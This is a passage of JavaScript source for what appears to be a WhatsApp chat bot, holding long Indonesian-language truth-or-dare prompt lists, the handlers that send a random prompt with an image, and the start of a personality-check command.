    "Tunjukkan keahlianmu dalam memainkan alat musik perkusi kepada teman-temanmu.",
    "Buat seni lukis menggunakan cat air dengan tema alam dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang menarik dan eksotis, dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan cerita petualangan dengan suara yang seru dan mengasyikkan, dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan kartu remi kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari hip-hop freestyle kepada teman-temanmu.",
    "Ambil selfie dengan pose paling modis dan gaya sekaligus, dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat pelan dan lembut, dengan gaya bicara yang santai, selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari bollywood kepada teman-temanmu.",
    "Buat video membacakan puisi cinta dengan suara yang penuh kasih sayang dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang mempesona dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan cerita lucu dengan suara yang ceria dan kocak, dan bagikan di grup.",
    "Tunjukkan gerakan tari salsa kepada teman-temanmu.",
    "Buat video mengucapkan selamat ulang tahun dengan membuat lagu ulang tahun yang penuh semangat dan kreatif.",
    "Ambil foto objek seni di sekitarmu dengan sudut pandang yang unik dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang teknologi favoritmu dan bagikan di grup.",
    "Tunjukkan gerakan senam pilates kepada teman-temanmu.",
    "Buat mimik wajah paling ekspresif dan konyol sekaligus, dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh keceriaan dan kehangatan.",
    "Tunjukkan keahlianmu dalam memainkan alat musik digital kepada teman-temanmu.",
    "Buat seni lukis menggunakan teknik kolase dengan berbagai macam bahan yang unik dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang menarik dan eksotis, dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan cerita petualangan dengan suara yang seru dan mengasyikkan, dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan benda-benda sehari-hari kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari tango kepada teman-temanmu.",
    "Ambil selfie dengan pose paling modis dan kreatif sekaligus, dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat pelan dan lembut, dengan gaya bicara yang santai dan tenang, selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari breakdance kepada teman-temanmu.",
    "Buat video membacakan puisi cinta dengan suara yang penuh kasih sayang dan romantis, dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang mempesona dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan cerita lucu dengan suara yang ceria dan kocak, dan bagikan di grup.",
    "Tunjukkan gerakan tari salsa kepada teman-temanmu.",
    "Buat video mengucapkan selamat ulang tahun dengan membuat lagu ulang tahun yang penuh semangat dan kreatif.",
    "Ambil foto objek seni di sekitarmu dengan sudut pandang yang unik dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang makanan favoritmu dan bagikan di grup.",
    "Tunjukkan gerakan senam pilates kepada teman-temanmu.",
    "Buat mimik wajah paling ekspresif dan konyol sekaligus, dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh keceriaan dan kehangatan.",
    "Tunjukkan keahlianmu dalam memainkan alat musik digital kepada teman-temanmu.",
    "Buat seni lukis menggunakan teknik kolase dengan berbagai macam bahan yang unik dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang menarik dan eksotis, dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan cerita petualangan dengan suara yang seru dan mengasyikkan, dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan benda-benda sehari-hari kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari tango kepada teman-temanmu.",
    "Ambil selfie dengan pose paling modis dan kreatif sekaligus, dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat pelan dan lembut, dengan gaya bicara yang santai dan tenang, selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari breakdance kepada teman-temanmu.",
    "Buat video membacakan puisi cinta dengan suara yang penuh kasih sayang dan romantis, dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang mempesona dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan cerita lucu dengan suara yang ceria dan kocak, dan bagikan di grup.",
    "Tunjukkan gerakan tari salsa kepada teman-temanmu.",
    "Buat video mengucapkan selamat ulang tahun dengan membuat lagu ulang tahun yang penuh semangat dan kreatif.",
    "Ambil foto objek seni di sekitarmu dengan sudut pandang yang unik dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang teknologi favoritmu dan bagikan di grup.",
    "Tunjukkan gerakan senam pilates kepada teman-temanmu.",
   "Makan makanan pedas tanpa minum selama 1 menit.",
    "Buat tarian konyol dan tampilkan di depan teman-temanmu.",
    "Lakukan panggilan video dengan temanmu dan tunjukkan bakat menyanyimu.",
    "Tunjukkan gerakan tarian terbaikmu di tengah-tengah keramaian.",
    "Kirim pesan suara menyanyikan lagu cinta kepada seseorang yang kamu sukai.",
    "Beri komplimen kepada setiap anggota grup dengan kata-kata yang penuh kebaikan.",
    "Bicaralah dengan aksen yang berbeda selama 5 menit.",
    "Tunjukkan aksi sulap sederhana kepada temanmu.",
    "Ganti nama di akun media sosialmu menjadi 'Superhero' selama 24 jam.",
    "Ambil foto wajah terbaikmu dan jadikan sebagai foto profil selama 1 hari.",
    "Hubungi seseorang yang tidak pernah kamu bicarakan dan ajak mereka untuk berteman.",
    "Buat puisi singkat tentang alam dan bacakan kepada teman-temanmu.",
    "Tulis sebuah cerita pendek dalam waktu 10 menit dan bagikan ke grup.",
    "Kirim meme lucu kepada teman-temanmu untuk membuat mereka tertawa.",
    "Buat video mengucapkan selamat ulang tahun untuk seseorang yang sedang berulang tahun.",
    "Tunjukkan keahlianmu dalam memainkan alat musik kepada teman-temanmu.",
    "Buat sketsa singkat tentang kehidupan sehari-hari dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan benda-benda di sekitarmu.",
    "Buat senyuman paling lebar dan kirim foto senyummu kepada teman-temanmu.",
    "Baca puisi cinta favoritmu dengan perasaan yang mendalam.",
    "Ambil foto dirimu sedang melakukan aksi lucu dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan kisah lucu yang pernah kamu alami dan bagikan di grup.",
    "Tunjukkan gerakan tarian terburukmu di depan teman-temanmu.",
    "Tunjukkan keahlianmu dalam membuat origami dan berikan hadiah kecil kepada teman-temanmu.",
    "Ambil selfie dengan ekspresi paling lucu dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat pelan selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan parkour sederhana di depan teman-temanmu.",
    "Buat video komedi pendek dengan sketsa yang lucu dan bagikan di grup.",
    "Ambil foto objek yang indah di sekitarmu dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang hobi teman-temanmu dan bagikan di grup.",
    "Tunjukkan gerakan tari khas daerahmu kepada teman-temanmu.",
    "Buat mimik wajah paling lucu dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh perasaan.",
    "Tunjukkan keahlianmu dalam memainkan permainan video kepada teman-temanmu.",
    "Buat seni lukis sederhana menggunakan pensil atau cat air dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan dongeng pendek dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan kartu remi kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari sederhana kepada teman-temanmu.",
    "Ambil foto dirimu sedang melakukan pose yoga dan jadikan sebagai foto profil selama 1 hari.",
    "Buat sketsa wajah temanmu dengan gaya kartun dan bagikan di grup.",
    "Tunjukkan keahlianmu dalam memasak hidangan favoritmu kepada teman-temanmu.",
    "Buat video komedi singkat dengan dialog yang lucu dan bagikan di grup.",
    "Ambil selfie dengan ekspresi paling serius dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat keras selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari modern kepada teman-temanmu.",
    "Buat video membacakan puisi cinta favoritmu dengan perasaan yang mendalam dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang menakjubkan dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan pengalaman seram yang pernah kamu alami dan bagikan di grup.",
    "Tunjukkan gerakan tari khas suku tertentu kepada teman-temanmu.",
    "Buat video mengucapkan selamat ulang tahun dengan menyanyikan lagu ulang tahun yang penuh semangat.",
    "Ambil foto objek yang menarik di sekitarmu dengan sudut pandang yang kreatif dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang makanan favoritmu dan bagikan di grup.",
    "Tunjukkan gerakan senam atau yoga kepada teman-temanmu.",
    "Buat mimik wajah paling serius dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh kehangatan.",
    "Tunjukkan keahlianmu dalam memainkan alat musik tradisional kepada teman-temanmu.",
    "Buat seni lukis menggunakan tangan kosong dengan teknik finger painting dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang tidak biasa dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan dongeng klasik dengan suara yang dramatis dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan benda-benda sehari-hari kepada teman-temanmu.",
    "Buat video mengajarkan gerakan tari tradisional kepada teman-temanmu.",
    "Ambil selfie dengan pose paling artistik dan bagikan di grup.",
    "Bicaralah dengan suara yang sangat cepat selama 10 menit di panggilan suara dengan temanmu.",
    "Tunjukkan gerakan tari hip-hop kepada teman-temanmu.",
    "Buat video membacakan puisi cinta buatanmu sendiri dengan perasaan yang mendalam dan bagikan di grup.",
    "Ambil foto dirimu sedang melakukan aksi yang kreatif dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara menceritakan cerita lucu yang pernah kamu alami dan bagikan di grup.",
    "Tunjukkan gerakan tari balet kepada teman-temanmu.",
    "Buat video mengucapkan selamat ulang tahun dengan menyanyikan lagu ulang tahun dengan suara merdu.",
    "Ambil foto objek alam yang indah di sekitarmu dan jadikan sebagai wallpaper ponselmu selama 1 hari.",
    "Buat pantun lucu tentang hewan favoritmu dan bagikan di grup.",
    "Tunjukkan gerakan senam jantung sehat kepada teman-temanmu.",
    "Buat mimik wajah paling kreatif dan bagikan di grup.",
    "Buat video mengucapkan terima kasih kepada teman-temanmu dengan penuh keceriaan.",
    "Tunjukkan keahlianmu dalam memainkan alat musik modern kepada teman-temanmu.",
    "Buat seni lukis abstrak dengan warna-warna cerah dan bagikan di grup.",
    "Ambil foto dengan pose superhero favoritmu di tempat yang indah dan jadikan sebagai foto profil selama 1 hari.",
    "Buat rekaman suara membacakan dongeng interaktif dengan berbagai suara karakter dan bagikan di grup.",
    "Tunjukkan trik sulap sederhana menggunakan uang koin kepada teman-temanmu."
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://telegra.ph/file/87ea7fa4801aecb2ddf38.jpg`)
              XeonBotInc.sendMessage(from, { image: bufferdare, caption: '*Anda Memilih DARE*\n'+ xeondare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
  "Apakah kamu pernah menyukai seseorang? Berapa lama?",
  "Kalau bisa atau kalau mau, gc/gc luar yang mana yang akan kamu jadikan teman? (mungkin beda/tipe sama)",
  "Apa ketakutan terbesar kamu?",
  "Pernahkah kamu menyukai seseorang dan merasa orang itu juga menyukaimu?",
  "Siapa nama mantan pacar temanmu yang dulu kamu suka diam-diam?",
  "Apakah kamu pernah mencuri uang dari ayah atau ibumu? Alasannya?",
  "Apa yang membuatmu bahagia saat sedih?",
  "Pernah cinta bertepuk sebelah tangan? Kalo pernah sama siapa? Gimana rasanya, bro?",
  "Pernah menjadi simpanan seseorang?",
  "Hal yang paling ditakuti",
  "Siapakah orang yang paling berpengaruh dalam hidupmu?",
  "Hal membanggakan apa yang kamu dapatkan tahun ini?",
  "Siapa orang yang bisa membuatmu luar biasa?",
  "Siapakah orang yang pernah membuatmu sangat bahagia?",
  "Siapa yang paling dekat dengan tipe pasangan idealmu di sini?",
  "Kamu suka main dengan siapa?",
  "Pernahkah kamu menolak seseorang? Alasannya kenapa?",
  "Sebutkan kejadian yang membuatmu terluka yang masih kamu ingat",
  "Prestasi apa yang kamu dapatkan tahun ini?",
  "Apa kebiasaan terburukmu di sekolah?",
  "Lagu apa yang paling sering kamu nyanyikan saat mandi?",
  "Apakah kamu pernah memiliki pengalaman mendekati kematian?",
  "Kapan terakhir kali kamu benar-benar marah? Kenapa?",
  "Siapa orang terakhir yang meneleponmu?",
  "Apakah kamu memiliki bakat tersembunyi? Apa itu?",
  "Kata apa yang paling kamu benci?",
  "Apa video YouTube terakhir yang kamu tonton?",
  "Apa hal terakhir yang Anda cari di Google?",
  "Dengan siapa di grup ini kamu ingin bertukar kehidupan selama seminggu?",
  "Apa hal paling menakutkan yang pernah terjadi padamu?",
  "Pernahkah kamu kentut dan menyalahkan orang lain?",
  "Kapan terakhir kali kamu membuat orang lain menangis?",
  "Pernahkah kamu meng-ghost teman?",
  "Pernahkah kamu melihat mayat?",
  "Siapa di antara anggota keluargamu yang paling mengganggumu dan mengapa?",
  "Jika Anda harus menghapus satu aplikasi dari ponsel Anda, aplikasi mana yang akan dipilih?",
  "Aplikasi apa yang paling Anda buang waktu?",
  "Pernahkah kamu berpura-pura sakit untuk pulang sekolah?",
  "Barang apa yang paling memalukan di kamarmu?",
  "Lima barang apa yang akan kamu bawa jika kamu terjebak di pulau terpencil?",
  "Pernahkah kamu tertawa begitu keras hingga pipis di celana?",
  "Apakah kamu mencium bau kentutmu sendiri?",
  "Apakah kamu pernah pipis di tempat tidur saat tidur?",
  "Apa kesalahan terbesar yang pernah kamu buat?",
  "Pernahkah kamu menyontek saat ujian?",
  "Apa hal terburuk yang pernah kamu lakukan?",
  "Kapan terakhir kali kamu menangis?",
  "Siapa yang paling kamu cintai di antara orang tuamu?",
  "Apakah kamu kadang-kadang memasukkan jarimu ke dalam lubang hidung?",
  "Siapa yang kamu suka saat sekolah?",
  "Katakan dengan jujur, apakah kamu menyukai laki-laki di grup ini?",
  "Apakah kamu pernah menyukai seseorang? Sudah berapa lama?",
  "Apakah kamu punya pacar? Apa ketakutan terbesarmu?",
  "Pernahkah kamu menyukai seseorang dan merasa orang itu juga menyukaimu?",
  "Siapa nama mantan pacar temanmu yang pernah kamu sukai diam-diam?",
  "Pernahkah kamu mencuri uang ibumu atau uang ayahmu?",
  "Apa yang membuatmu bahagia saat kamu sedih?",
  "Apakah kamu menyukai seseorang yang ada di grup ini? Kalau kamu lalu siapa?",
  "Apakah kamu pernah ditipu orang?",
  "Siapakah orang yang paling penting dalam hidupmu?",
  "Hal membanggakan apa yang kamu dapatkan tahun ini?",
  "Siapa orang yang bisa membuatmu bahagia saat kamu sedih?",
  "Siapakah orang yang pernah membuatmu merasa tidak nyaman?",
  "Apakah kamu pernah berbohong kepada orang tuamu?",
  "Apakah kamu masih menyukai mantanmu?",
  "Dengan siapa kamu suka bermain bersama?",
  "Apakah kamu pernah mencuri barang berharga dalam hidupmu? Alasannya kenapa?",
  "Sebutkan kejadian yang membuatmu terluka yang masih kamu ingat",
  "Prestasi apa yang kamu dapatkan tahun ini?",
  "Apa kebiasaan terburukmu di sekolah?",
  "Apakah Anda menyukai pembuat bot, Hoshino?",
  "Pernahkah kamu berpikir untuk membalas dendam dari gurumu?",
  "Apakah Anda menyukai perdana menteri negara Anda saat ini?",
  "Apakah Anda lebih suka daging atau sayuran?",
  "Jika kamu bisa menjadi tidak terlihat, apa hal pertama yang akan kamu lakukan?",
  "Rahasia apa yang kamu sembunyikan dari orang tuamu?",
  "Siapa naksir rahasiamu?",
  "Siapa orang terakhir yang kamu stalk di media sosial?",
  "Jika seorang jin mengabulkan tiga keinginanmu, apa yang akan kamu minta?",
  "Apa penyesalan terbesarmu?",
  "Menurutmu binatang apa yang paling mirip denganmu?",
  "Berapa banyak selfie yang kamu ambil dalam sehari?",
  "Apa acara masa kecil favoritmu?",
  "Jika kamu bisa menjadi karakter fiksi selama sehari, siapa yang akan kamu pilih?",
  "Siapa yang paling sering kamu SMS?",
  "Apa kebohongan terbesar yang pernah kamu katakan kepada orang tuamu?",
  "Siapa selebritas yang kamu sukai?",
  "Apa mimpi teraneh yang pernah kamu alami?",
  "Apakah kamu bermain PUBG? Jika iya, tolong kirimkan nomor ID-mu.",
  "Apakah kamu pernah berbohong kepada sahabatmu? Alasannya?",
  "Siapa orang yang paling kamu kagumi di dunia?",
  "Pernahkah kamu menjatuhkan barang berharga milik orang lain? Ceritakan.",
  "Apa hal paling aneh yang pernah kamu lihat di jalan?",
  "Pernahkah kamu berbohong kepada pasanganmu? Alasannya?",
  "Siapa selebritas yang kamu benci? Mengapa?",
  "Apakah kamu pernah memalsukan identitas online? Mengapa?",
  "Apa hal terbesar yang kamu korbankan demi orang lain?",
  "Pernahkah kamu melakukan tindakan yang melanggar hukum? Ceritakan.",
  "Siapa orang yang paling membuatmu iri? Mengapa?",
  "Apakah ada kebiasaan buruk yang ingin kamu tinggalkan? Apa itu?",
  "Apa makanan yang paling kamu benci? Mengapa?",
  "Pernahkah kamu mengkhianati kepercayaan seseorang? Ceritakan.",
  "Siapa tokoh fiksi favoritmu? Mengapa?",
  "Apakah kamu pernah memutuskan hubungan dengan seseorang secara tidak baik? Alasannya?",
  "Apa impian terbesar yang ingin kamu wujudkan?",
  "Pernahkah kamu mengambil hak orang lain? Ceritakan.",
  "Siapa guru favoritmu di masa kecil? Mengapa?",
  "Apakah kamu pernah merasa bersalah karena menyakiti seseorang? Alasannya?",
  "Apa kebiasaan terbaik yang ingin kamu tingkatkan?",
  "Pernahkah kamu mengingkari janji yang telah kamu buat? Ceritakan.",
  "Siapa pahlawan favoritmu? Mengapa?",
  "Apakah kamu pernah mengecewakan orang yang sangat kamu sayangi? Ceritakan.",
  "Apa hal terburuk yang pernah kamu katakan kepada seseorang?",
  "Pernahkah kamu merasa dirimu tidak berarti? Mengapa?",
  "Siapa musuh terbesarmu? Mengapa?",
  "Apakah kamu pernah berbohong kepada dirimu sendiri? Alasannya?",
  "Apa hal yang paling ingin kamu ubah dari dirimu?",
  "Pernahkah kamu mengambil keuntungan dari kelemahan orang lain? Ceritakan.",
  "Siapa tokoh sejarah yang paling kamu kagumi? Mengapa?",
  "Apakah ada kejadian yang membuatmu merasa sangat menyesal? Ceritakan.",
  "Apa kelemahan terbesarmu? Mengapa?",
  "Pernahkah kamu mengabaikan seseorang yang berarti bagimu? Alasannya?",
  "Siapa orang yang paling kamu kagumi di grup ini?",
  "Apakah kamu pernah memanipulasi orang lain? Ceritakan.",
  "Apa hal yang paling ingin kamu capai dalam hidup ini?",
  "Pernahkah kamu merasa iri terhadap keberhasilan orang lain? Mengapa?",
  "Siapa tokoh terkenal yang paling kamu tidak suka? Mengapa?",
  "Apakah kamu pernah menyalahkan orang lain atas kesalahanmu sendiri? Alasannya?",
  "Apa yang membuatmu merasa tidak aman?",
  "Pernahkah kamu berbohong kepada dirimu sendiri agar terlihat lebih baik? Ceritakan.",
  "Siapa orang yang paling kamu rindukan? Mengapa?",
  "Apakah kamu pernah membuat janji yang tidak bisa kamu tepati? Alasannya?",
  "Apa impian terbesarmu yang belum tercapai?",
  "Pernahkah kamu menjatuhkan orang lain agar kamu bisa naik? Ceritakan.",
  "Siapa yang paling berpengaruh dalam kehidupanmu saat ini?",
  "Apakah ada sesuatu yang ingin kamu katakan kepada seseorang, tapi belum pernah kamu sampaikan? Apa itu?",
  "Apa hal yang paling ingin kamu ubah dari masa lalu?",
  "Pernahkah kamu melakukan sesuatu yang sangat berisiko? Ceritakan.",
  "Siapa teman yang paling bisa kamu andalkan dalam situasi sulit?",
  "Apakah kamu pernah memanfaatkan seseorang demi keuntunganmu sendiri? Ceritakan.",
  "Apa hal yang paling ingin kamu capai dalam waktu dekat?",
  "Pernahkah kamu membuat orang lain terluka secara sengaja? Alasannya?",
  "Siapa sosok yang paling kamu kagumi dalam hidup ini? Mengapa?",
  "Apakah kamu pernah mengkhianati rahasia seseorang? Ceritakan.",
  "Apa yang paling kamu sesali tentang hubungan asmaramu yang lalu?",
  "Pernahkah kamu menjatuhkan orang lain hanya karena kesalahan kecil? Ceritakan.",
  "Siapa tokoh terkenal yang paling kamu kagumi? Mengapa?",
  "Apakah ada kejadian yang membuatmu merasa sangat malu? Ceritakan.",
  "Apa yang paling membuatmu merasa tidak berharga?",
  "Pernahkah kamu mengorbankan nilai-nilai pentingmu demi popularitas? Ceritakan.",
  "Siapa orang yang paling kamu cintai di luar keluarga? Mengapa?",
  "Apakah kamu pernah menyembunyikan sesuatu yang penting dari orang yang kamu cintai? Ceritakan.",
  "Apa hal yang paling ingin kamu lupakan dari masa lalu?",
  "Pernahkah kamu mengabaikan kebutuhan seseorang yang kamu cintai? Alasannya?",
  "Siapa tokoh inspiratif yang paling kamu kagumi? Mengapa?",
  "Apakah kamu pernah menghancurkan hubungan persahabatanmu dengan sengaja? Ceritakan.",
  "Apa yang paling kamu sesali tentang tindakanmu dalam hubungan asmaramu yang lalu?",
  "Pernahkah kamu membuat seseorang merasa tidak berarti? Alasannya?",
  "Siapa orang yang paling berarti dalam hidupmu saat ini?",
  "Apakah kamu pernah menyalahgunakan kepercayaan seseorang? Ceritakan.",
  "Apa yang paling kamu sesali tentang cara kamu memperlakukan orang lain?",
  "Pernahkah kamu merasa tidak pantas mendapatkan kebahagiaan? Mengapa?",
  "Siapa tokoh olahraga yang paling kamu kagumi? Mengapa?",
  "Apakah kamu pernah mengecewakan dirimu sendiri? Ceritakan.",
  "Apa yang paling kamu sesali tentang tindakanmu dalam hubungan keluargamu?",
  "Pernahkah kamu melakukan sesuatu yang melanggar nilai-nilai etika? Ceritakan.",
  "Siapa tokoh politik yang paling kamu kagumi? Mengapa?",
  "Apakah kamu pernah memanipulasi perasaan seseorang demi keuntunganmu sendiri? Ceritakan.",
  "Apa yang paling kamu sesali tentang cara kamu memperlakukan dirimu sendiri?",
  "Pernahkah kamu merasa tidak layak menerima cinta? Mengapa?",
  "Siapa orang yang paling kamu kagumi dalam bidang seni? Mengapa?",
  "Apakah kamu pernah mempengaruhi seseorang agar mereka melakukan sesuatu yang tidak benar? Ceritakan.",
  "Apa yang paling kamu sesali tentang tindakanmu dalam hubungan persahabatanmu?",
  "Pernahkah kamu menjatuhkan orang lain hanya untuk kepuasan dirimu sendiri? Ceritakan.",
  "Siapa tokoh inspiratif yang paling kamu kagumi? Mengapa?",
  "Apakah kamu pernah mengkhianati janji yang penting? Ceritakan.",
  "Apa yang paling kamu sesali tentang tindakanmu dalam hubungan asmaramu yang lalu?",
  "Pernahkah kamu membuat seseorang merasa tidak berarti? Alasannya?",
  "Siapa orang yang paling berarti dalam hidupmu saat ini?",
  "Apakah kamu pernah menyalahgunakan kepercayaan seseorang? Ceritakan.",
  "Apa yang paling kamu sesali tentang cara kamu memperlakukan orang lain?",
  "Apa hal yang paling membuatmu merasa kikuk saat bertemu orang baru?",
  "Pernahkah kamu menyesali keputusan besar yang pernah kamu ambil? Apa itu?",
  "Siapa tokoh politik yang paling kamu kagumi? Mengapa?",
  "Apakah kamu pernah mengkhianati kepercayaan seseorang? Ceritakan.",
  "Apa yang paling kamu sesali tentang hubungan asmaramu yang lalu?",
  "Pernahkah kamu merasa tidak dihargai di tempat kerja? Bagaimana kamu menghadapinya?",
  "Siapa orang yang paling kamu cintai di luar keluarga? Mengapa?",
  "Apakah kamu pernah memiliki obsesi yang tidak sehat? Apa itu?",
  "Apa yang paling membuatmu merasa tertekan saat menghadapi masalah?",
  "Pernahkah kamu terjebak dalam perasaan cemburu yang tidak sehat? Ceritakan.",
  "Siapa selebritas yang menurutmu paling overrated? Mengapa?",
  "Apa yang paling membuatmu tertawa hingga sakit perut?",
  "Pernahkah kamu melakukan perjalanan sendirian? Bagaimana pengalamanmu?",
  "Apa hal yang paling membuatmu stres dalam pekerjaanmu?",
  "Siapa tokoh sejarah yang paling kamu kagumi? Mengapa?",
  "Apakah kamu pernah mengkhianati rahasia seseorang? Alasannya?",
  "Apa yang paling kamu sesali tentang hubungan asmaramu yang lalu?",
  "Pernahkah kamu merasa tidak adil di tempat kerja? Ceritakan.",
  "Siapa orang yang paling kamu cintai di luar keluarga? Mengapa?",
  "Apakah kamu pernah memiliki obsesi yang tidak sehat? Apa itu?",
  "Apa yang paling membuatmu gelisah saat menghadapi situasi sosial?",
  "Pernahkah kamu merasa tidak cukup baik bagi seseorang yang kamu cintai?",
  "Siapa tokoh fiksi yang paling kamu kagumi? Mengapa?",
  "Apa kegiatan yang membuatmu merasa hidupmu berarti?",
  "Apakah kamu pernah memendam perasaan kepada seseorang yang sudah memiliki pasangan? Ceritakan.",
  "Siapa temanmu yang paling sukses? Apa yang membuatmu iri padanya?",
  "Apa hal yang paling kamu takuti dalam hidup ini?",
  "Pernahkah kamu terlibat dalam suatu perselisihan fisik? Ceritakan.",
  "Siapa orang yang paling mempengaruhi pilihan fashionmu?",
  "Apakah kamu pernah memendam rasa iri terhadap sahabatmu? Alasannya?",
  "Apa yang paling membuatmu frustasi dalam hubungan asmaramu yang lalu?",
  "Pernahkah kamu menolak tawaran pekerjaan yang sebenarnya kamu inginkan? Mengapa?",
  "Siapa penulis favoritmu? Mengapa kamu menyukai karyanya?",
  "Apakah kamu pernah merasa tidak diterima oleh lingkungan sekitarmu?",
  "Apa yang paling membuatmu tegang saat berbicara di depan umum?",
  "Pernahkah kamu menyakiti seseorang secara tidak sengaja? Bagaimana kamu memperbaikinya?",
  "Siapa selebritas yang menurutmu paling underrated? Mengapa?",
  "Apa yang paling membuatmu takut saat berada di tempat yang gelap?",
  "Pernahkah kamu membuat kesalahan besar dalam pekerjaanmu? Ceritakan.",
  "Siapa seniman favoritmu? Mengapa kamu menyukai karya-karyanya?",
  "Apakah kamu pernah merasa terjebak dalam rutinitas yang membosankan? Bagaimana kamu mengatasinya?",
  "Apa yang paling membuatmu gugup saat berkencan?",
  "Pernahkah kamu menyembunyikan perasaanmu agar tidak menyakiti orang lain?",
  "Siapa tokoh inspiratif yang paling kamu kagumi? Mengapa?",
  "Apakah kamu pernah berpura-pura menyukai sesuatu hanya untuk menyenangkan orang lain?",
  "Apa hal yang paling membuatmu merasa tidak percaya diri?",
  "Pernahkah kamu merasa tidak mampu mencapai tujuanmu? Mengapa?",
  "Siapa orang yang paling kamu kagumi dalam bidang teknologi? Mengapa?",
  "Apakah kamu pernah merasa terjebak dalam rutinitas yang tidak kamu sukai? Bagaimana kamu mengatasinya?",
  "Apa yang paling membuatmu gugup saat tampil di depan umum?",
  "Pernahkah kamu merasa tidak diterima oleh lingkungan sekitarmu?",
  "Siapa penulis komik favoritmu? Mengapa kamu menyukai karyanya?",
  "Apakah kamu pernah merasa dirimu tidak cukup baik bagi seseorang yang kamu cintai?",
  "Apa yang paling membuatmu khawatir saat berada di tempat yang ramai?",
  "Pernahkah kamu membuat kesalahan besar dalam kehidupan asmaramu? Ceritakan.",
  "Siapa pembawa acara TV favoritmu? Mengapa kamu menyukainya?",
  "Apakah kamu pernah merasa tidak puas dengan pekerjaanmu?",
  "Apa yang paling membuatmu gugup saat wawancara kerja?",
  "Pernahkah kamu merasa tidak adil dibandingkan dengan orang lain? Mengapa?",
  "Siapa penulis lagu favoritmu? Mengapa kamu menyukai lirik-liriknya?",
  "Apakah ada masa lalu yang ingin kamu ubah? Apa itu?",
  "Apa yang paling membuatmu takut saat berada di tempat yang sunyi?",
  "Pernahkah kamu membuat kesalahan besar dalam pekerjaanmu? Ceritakan."
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://telegra.ph/file/87ea7fa4801aecb2ddf38.jpg`)
              XeonBotInc.sendMessage(from, { image: buffertruth, caption: '*Anda Memilih TRUTH*\n'+ xeontruth }, {quoted:m})
              break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = [
  'Baik',
  'Tidak Ramah',
  'Chapri',
  'Nibba/nibbi',
  'Menjengkelkan',
  'Boros',
  'Orang Marah',
  'Sopan',
  'Beban',
  'Hebat',
  'Cringe',
  'Pembohong',
  'Pembuat Masalah',
  'Genit',
  'Penyabar',
  'Pendiam',
  'Cengeng',
  'Perhatian',
  'Ramah',
  'Pendendam',
  'Pemberani',
  'Inspiratif',
  'Kreatif',
  'Bersemangat',
  'Adil',
  'Optimis',
  'Berbakat',
  'Bermartabat',
  'Pendukung',
  'Pemimpin',
  'Teliti',
  'Sabar'
]
					var hobi = ['Memasak', 'Menari', 'Bermain', 'Bermain Game', 'Melukis', 'Membantu Orang Lain', 'Menonton anime', 'Membaca', 'Bersepeda', 'Bernyanyi', 'Bercakap-cakap', 'Berbagi Meme', 'Menggambar', 'Menghabiskan Uang Orang Tua', 'Bermain Truth or Dare', 'Menyendiri'];
